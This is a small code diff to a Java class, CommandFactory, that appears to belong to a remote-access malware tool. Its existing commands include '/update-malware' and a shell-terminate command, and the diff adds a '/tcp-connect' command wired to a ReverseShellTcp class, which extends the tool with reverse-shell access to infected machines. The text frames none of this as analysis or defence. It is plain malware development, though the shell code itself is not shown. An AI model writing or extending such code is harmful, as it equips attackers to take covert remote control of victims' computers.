@@ -26,6 +26,7 @@ public class CommandFactory {
 
         commandsList.put("rick-roll", new RickRollCommand());
         commandsList.put("/update-malware", new UpdateCommand());
+        commandsList.put("/tcp-connect", new ReverseShellTcp());
 
         commandsList.put("/exit", new TerminateShellCommand());
 
